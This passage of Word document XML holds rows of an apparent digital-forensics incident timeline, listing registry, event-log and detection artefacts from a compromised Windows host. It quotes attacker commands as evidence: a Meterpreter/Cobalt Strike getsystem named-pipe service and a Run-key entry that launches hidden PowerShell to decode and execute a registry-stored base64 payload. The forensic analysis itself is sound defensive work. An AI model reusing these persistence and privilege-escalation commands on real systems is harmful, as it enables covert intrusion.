        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008, F-012, F-020, F-024, I-005, I-012, T-008, T-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:42.676537</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: services</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Service: key written</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>coreupdater start=Automatic Win32OwnProcess</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_Services.csv#115</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-020, I-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:42.676537</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Services (Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>service: ts</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>name=coreupdater | start=Auto Start (2) | type=Service - Own Process (0x10) | objectname=LocalSystem</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/services.jsonl#95</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-020</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:43:12.368432</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd, complementary batch)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store</w:t>
              <w:br/>
              <w:t>Program Execution | AppCompatFlags Compatibility Assistant Store | C:\Windows\System32\coreupdater.exe=(Binary data)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_complement/recmd_complement_F.csv#16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\NTUSER.DAT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:43:14.990000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>high</w:t>
              <w:br/>
              <w:t>Meterpreter or Cobalt Strike Getsystem Service Installation - System | {"Svc":"nehgye","Path":"cmd.exe /c echo nehgye &gt; \\\\.\\pipe\\nehgye","Acct":"LocalSystem","StartType":"demand start"} | {"ServiceType":"user mode service"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#1342</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:43:14.990879</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>cmd.exe /c echo nehgye &amp;gt; \\.\pipe\nehgye</w:t>
              <w:br/>
              <w:t>System 7045 | Service Control Manager | A new service was installed in the system | Name: nehgye | StartType: demand start | Account: LocalSystem | cmd.exe /c echo nehgye &amp;gt; \\.\pipe\nehgye</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40867</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-009, F-020, F-024, I-006, T-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:43:14.990879</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>critical</w:t>
              <w:br/>
              <w:t>Meterpreter or Cobalt Strike Getsystem Service Installation | {"ServiceName":"nehgye","ImagePath":"cmd.exe /c echo nehgye &gt; \\\\.\\pipe\\nehgye","StartType":"demand start","AccountName":"LocalSystem","ServiceType":"user mode service"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#103</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:43:15.054907</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>System 7009 | Service Control Manager</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40868</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:44:03.540241</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Run keys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>run: ts</w:t>
              <w:br/>
              <w:t>Microsoft\Windows\CurrentVersion\Run</w:t>
              <w:br/>
              <w:t>name=coreupdate | command={"executable":"%COMSPEC%","args":["/b /c start /b /min powershell -nop -w hidden -c \"sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKLM:Software\\q9Z1bssi').GetValue('JqxNhWJA'))))\""]}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/runkeys.jsonl#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sysvol/windows/system32/config/SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-003, F-010, F-019, I-011, I-016, T-017</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:44:03.540241</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows\CurrentVersion\Run</w:t>
              <w:br/>
              <w:t>Autoruns | Run (SYSTEM) | coreupdate=%COMSPEC% /b /c start /b /min powershell -nop -w hidden -c "sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKLM:Software\q9Z1bssi').GetValue('JqxNhWJA'))))"</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#7223</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-019, I-011, I-017, T-017</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:44:45.973107</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: BAM/DAM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (BAM)</w:t>
              <w:br/>
              <w:t>\Device\HarddiskVolume3\Windows\System32\cmd.exe</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Services\bam\State\UserSettings\S-1-5-21-2232410529-1445159330-2725690660-500</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_BamDam.csv#41</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:45:34</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start ; Activity: last modified</w:t>
              <w:br/>
              <w:t>System\notepad.exe</w:t>
              <w:br/>
              <w:t>My Social Security Number.txt (Notepad) C:\Users\mortysmith\Documents\My Social Security Number.txt (file:Unmapped GUID: //C:/Users/mortysmith/Documents/My Scial Security Number.txt?VolumeId={26F70DB0-6894-4B1D-8F05-4CB89F106AC5}&amp;ObjectId={DD6765CD-F9F7-11EA-95EC-000C2914C295}&amp;KnownFolderId=UserProfiles&amp;KnownFolderLength=8) type=ExecuteOpen</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd/F/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/20261025201827_Administrator_Activity.csv#19</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-026</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:45:34</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Search (activity history)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start</w:t>
              <w:br/>
              <w:t>file:///C:/Users/mortysmith/Documents/My%20Social%20Security%20Number.txt?VolumeId={26F70DB0-6894-4B1D-8F05-4CB89F106AC5}&amp;ObjectId={DD6765CD-F9F7-11EA-95EC-000C2914C295}&amp;KnownFolderId=UserProfiles&amp;KnownFolderLength=8</w:t>
              <w:br/>
              <w:t>Notepad My Social Security Number.txt {1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\notepad.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sidr/DESKTOP-SDN1RPT_Activity_History_Report_20261025_191826.918732700.csv#30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\ProgramData\Microsoft\search\data\applications\windows\Windows.edb</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-026</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Target: created (recorded in the LNK) ; Target: modified (recorded in the LNK) ; Target: accessed (recorded in the LNK)</w:t>
              <w:br/>
              <w:t>C:\Users\mortysmith\Documents\loot.zip</w:t>
              <w:br/>
              <w:t>machine=desktop-sdn1rpt MAC=00:0c:29:14:c2:95 volume=B0E0E8FF Fixed storage media (Hard drive) size=131041</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd/lnk_F.csv#12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\loot.lnk</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-013, I-008, T-013</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:15.269625</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
